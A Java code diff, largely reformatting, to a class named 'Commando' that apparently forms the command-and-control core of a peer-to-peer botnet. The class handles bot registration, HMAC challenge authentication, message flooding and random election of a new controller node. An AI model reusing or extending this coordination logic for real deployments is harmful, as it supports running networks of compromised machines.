@@ -70,7 +70,6 @@ public class Commando {
 	@Autowired
 	private CryptoUtils crypto;
 
-
 	/**
 	 * 
 	 */
@@ -91,7 +90,7 @@ public class Commando {
 				nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), pki.getPubRSAKeyToString(),
 				(nServ.isElegible() + ""));
 		bServ.save(bot);
-		Pairs<IP,String> botAlive=new Pairs<IP, String>(new IP(bot.getIp()), bot.getIdBot());
+		Pairs<IP, String> botAlive = new Pairs<IP, String>(new IP(bot.getIp()), bot.getIdBot());
 		nServ.getAliveBot().add(botAlive);
 	}
 
@@ -101,12 +100,13 @@ public class Commando {
 	 */
 	public Pairs<Long, Integer> authReq(String idBot) {
 		Pairs<Long, Integer> response;
-		if(auth.getBotSeed().indexOfValue1(idBot)>=0)
+		if (auth.getBotSeed().indexOfValue1(idBot) >= 0)
 			return auth.getBotSeed().getByValue1(idBot).getValue2();
 		Long keyNumber = new Long(auth.generateNumberText());
 		Integer iterationNumber = new Integer(auth.generateIterationNumber());
-		auth.getBotSeed().add(new Pairs<String, Pairs<Long, Integer>>(idBot,new Pairs<Long, Integer>(keyNumber, iterationNumber)));
-//		auth.addBotChallengeInfo(idBot, keyNumber, iterationNumber);
+		auth.getBotSeed().add(
+				new Pairs<String, Pairs<Long, Integer>>(idBot, new Pairs<Long, Integer>(keyNumber, iterationNumber)));
+		// auth.addBotChallengeInfo(idBot, keyNumber, iterationNumber);
 		response = new Pairs<Long, Integer>(keyNumber, iterationNumber);
 		return response;
 	}
@@ -122,21 +122,21 @@ public class Commando {
 		SyncIpList<String, Pairs<Long, Integer>> lista = auth.getBotSeed();
 		if (lista != null) {
 			Pairs<String, Pairs<Long, Integer>> elem = lista.removeByValue1(idBot);
-			Pairs<Long, Integer> coppia=elem.getValue2();
+			Pairs<Long, Integer> coppia = elem.getValue2();
 			if (coppia != null) {
 				Long keyNumber = coppia.getValue1();
 				Integer iterationNumber = coppia.getValue2();
-					if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
-						response = "Challenge OK";
-						objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
-						Bot bot;
-						bot = new Bot(objects.get(0).toString(), objects.get(1).toString(), objects.get(2).toString(),
-								objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(),
-								objects.get(6).toString(), objects.get(8).toString(), objects.get(9).toString());
-						bServ.save(bot);
-						Pairs<IP,String> botAlive=new Pairs<IP, String>(new IP(bot.getIp()), bot.getIdBot());
-						nServ.getAliveBot().add(botAlive);
-					}
+				if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
+					response = "Challenge OK";
+					objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
+					Bot bot;
+					bot = new Bot(objects.get(0).toString(), objects.get(1).toString(), objects.get(2).toString(),
+							objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(),
+							objects.get(6).toString(), objects.get(8).toString(), objects.get(9).toString());
+					bServ.save(bot);
+					Pairs<IP, String> botAlive = new Pairs<IP, String>(new IP(bot.getIp()), bot.getIdBot());
+					nServ.getAliveBot().add(botAlive);
+				}
 			}
 		}
 		return response;
@@ -157,7 +157,6 @@ public class Commando {
 	public byte[] getNeighbours(String data) {
 		return pServ.getNeighbours(data);
 	}
-
 
 	/**
 	 * @param cmd
@@ -230,8 +229,8 @@ public class Commando {
 			System.out.println("start first flood");
 			newKingFlood(ip, pk);
 			nServ.getCommandConquerIps().remove(0);
-			nServ.getCommandConquerIps().add(new Pairs<IP, PublicKey>( ip, pki.rebuildPuK(pk)));
-		
+			nServ.getCommandConquerIps().add(new Pairs<IP, PublicKey>(ip, pki.rebuildPuK(pk)));
+
 			pServ.setNewKing("");
 
 			// TODO DropDATABASE
@@ -250,9 +249,9 @@ public class Commando {
 			ccReq.sendFloodToBot(pairs.getValue1().toString(), msg);
 		}
 		System.out.println("fine flood");
-//		nServ.getNeighbours().getList().forEach((pairs) -> {
-//			ccReq.sendFloodToBot(pairs.getValue1().toString(), msg);
-//		});
+		// nServ.getNeighbours().getList().forEach((pairs) -> {
+		// ccReq.sendFloodToBot(pairs.getValue1().toString(), msg);
+		// });
 	}
 
 	/**
@@ -266,56 +265,58 @@ public class Commando {
 		if (botList != null) {
 			for (Bot bot : botList) {
 				if (bot.getElegible().equals("true"))
-					ccList.add(bot.getIp());
+					if (nServ.getAliveBot().indexOfValue2(bot.getIdBot()) >= 0)
+						ccList.add(bot.getIp());
 			}
-			System.out.println(ccList.remove(nServ.getMyIp().toString()));
-			if (ccList.size() > 0) {
-				Long l = System.currentTimeMillis();
-				String s = l.toString()+ botList.size();
-				byte[] b = s.getBytes();
-				Random rnd = new SecureRandom(b);
-				Double d =rnd.nextDouble();
-				Integer size = (ccList.size()-1);
-				Double rand =  d * size;
-				Long lv = Math.round(rand);
-				Integer li = lv.intValue();
-				System.out.println("long to int"+ li);
-				String ip = ccList.get(li);
-				ccList.forEach((botIp )->System.out.println("bot Ip per sorteggio"+ botIp));
-				System.out.println("byte seed "+ b.toString());
-				System.out.println(" next double "+ d);
-				System.out.println("size "+size);
-				System.out.println("rand "+ rand);
-				System.out.println("byte seed "+ b.toString());
-				System.out.println("ho eletto " + ip);
-				if (ccReq.becameCc(ip)) {
-					pServ.setNewKing( bServ.searchBotIP(ip).getIdBot());
-				}
-				System.out.println("erection completed strating transfer ");
-			} else
-				System.out.println("nessuno da eleggere");
-			// elegilo passa i dati
-			// passa il potere
 		}
+
+		System.out.println(ccList.remove(nServ.getMyIp().toString()));
+		if (ccList.size() > 0) {
+			Long l = System.currentTimeMillis();
+			String s = l.toString() + botList.size();
+			byte[] b = s.getBytes();
+			Random rnd = new SecureRandom(b);
+			Double d = rnd.nextDouble();
+			Integer size = (ccList.size() - 1);
+			Double rand = d * size;
+			Long lv = Math.round(rand);
+			Integer li = lv.intValue();
+			System.out.println("long to int" + li);
+			String ip = ccList.get(li);
+			ccList.forEach((botIp) -> System.out.println("bot Ip per sorteggio" + botIp));
+			System.out.println("byte seed " + b.toString());
+			System.out.println(" next double " + d);
+			System.out.println("size " + size);
+			System.out.println("rand " + rand);
+			System.out.println("byte seed " + b.toString());
+			System.out.println("ho eletto " + ip);
+			if (ccReq.becameCc(ip)) {
+				pServ.setNewKing(bServ.searchBotIP(ip).getIdBot());
+			}
+			System.out.println("erection completed strating transfer ");
+		} else
+			System.out.println("nessuno da eleggere");
+		// elegilo passa i dati
+		// passa il potere
 	}
 
-	public byte[] syncNeightboursBot(List<String> data){
-		Boolean flag=false;
-		String idBot=data.remove(0);
-		List<String> deadBotList=data;
-		if(!deadBotList.isEmpty()){
+	public byte[] syncNeightboursBot(List<String> data) {
+		Boolean flag = false;
+		String idBot = data.remove(0);
+		List<String> deadBotList = data;
+		if (!deadBotList.isEmpty()) {
 			for (String ipDead : deadBotList) {
-				if(nServ.getAliveBot().removeByValue1(new IP(ipDead))!=null){
-					flag=true;
-				}else{
+				if (nServ.getAliveBot().removeByValue1(new IP(ipDead)) != null) {
+					flag = true;
+				} else {
 					System.out.println("VICINO NON PRESENTE NELLA LISTA DEI VICINI CHE NEL DB");
-				}			
+				}
 			}
-			if(flag){
-			pServ.updateNetworkP2P();
-			return getNeighbours(idBot);
+			if (flag) {
+				pServ.updateNetworkP2P();
+				return getNeighbours(idBot);
 			}
-		}else{
+		} else {
 			System.out.println("Nessuna modifica da effettuare alla lista dei vivi");
 		}
 		return null;
@@ -372,7 +373,16 @@ public class Commando {
 	public void setpServ(P2PMan pServ) {
 		this.pServ = pServ;
 	}
+
+	public CryptoUtils getCrypto() {
+		return crypto;
+	}
+
+	public void setCrypto(CryptoUtils crypto) {
+		this.crypto = crypto;
+	}
 	
+
 }
 
 // for (int i = 1; i < 20; i++) {
